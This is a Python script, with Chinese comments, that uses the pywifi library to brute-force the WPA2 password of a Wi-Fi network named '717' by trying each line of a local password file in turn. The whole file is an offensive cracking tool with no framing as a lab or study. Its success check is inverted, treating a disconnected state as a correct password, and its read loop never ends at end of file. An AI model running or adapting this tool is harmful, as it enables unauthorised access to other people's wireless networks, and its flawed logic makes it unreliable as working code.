import pywifi
from pywifi import const
import time
# 导入模块
# 抓取网卡接口
# 断开所有wifi
# 读取密码本
# 测试连接
# 设置睡眠时间

def gic(passwd):
    wifi = pywifi.PyWiFi()
    iface=wifi.interfaces()[0]
    # print(iface.name())
    iface.disconnect()
    time.sleep(2)
    if(iface.status()==const.IFACE_CONNECTED):
        print("已连接")
    else:
        print("未连接")

    # iface.scan()#扫描wifi
    # result=iface.scan_results()
    # for i in result:
    #     print(i.ssid)#打印wifi名字

    profile = pywifi.Profile()
    # wifi名称
    profile.ssid = "717"
    # 网卡开放
    profile.auth = const.AUTH_ALG_OPEN
    # 加密算法
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    # 加密单元
    profile.cipher = const.CIPHER_TYPE_CCMP
    # 密码
    profile.key = passwd
    #删除之前的连接文件
    iface.remove_all_network_profiles()
    newprofile=iface.add_network_profile(profile)
    iface.connect(newprofile)
    time.sleep(5)
    if(iface.status()==const.IFACE_DISCONNECTED):
        return True
    else:
        return False

# 读取密码
def readpsd():
    print("开始破解")
    path="C:\\Users\SAMSUNG\PycharmProjects\practice0829\wifiKey\pass.txt"
    file=open(path,"r")
    while(True):
        # 捕获读取文件出现的错误时的异常
        try:
            passStr=file.readline()#读取一行
            bool=gic(passStr)
            if bool:
                print("密码正确",passStr)
                break;
            else:
                print("密码错误,继续测试",passStr)
        except:
            continue
readpsd()

